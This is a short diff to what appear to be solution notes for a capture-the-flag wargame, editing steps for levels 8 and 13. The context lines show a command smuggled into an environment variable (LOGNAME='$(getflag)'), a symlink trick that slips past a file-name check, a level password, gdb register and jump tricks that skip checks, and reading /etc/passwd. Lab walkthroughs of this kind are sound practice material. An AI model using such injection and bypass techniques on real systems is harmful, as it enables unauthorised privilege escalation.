@@ -61,7 +61,7 @@ export LOGNAME='$(getflag)' ; ./level07
 ## 8.
 ltrace ./level08 token
 ln -s token my_tok && ./level08 my_tok
-su flag08 quif5eloekouj29ke0vouxean
+su flag08 #quif5eloekouj29ke0vouxean
 getflag
 
 ## 9.
@@ -105,7 +105,7 @@ set $eax=4242 # or 0x1092 - change register
 c # continue
 
 #or
-jump 0x80485cb
+jump *0x80485cb
 
 ## 14.
 cat /etc/passwd # get the number of the level
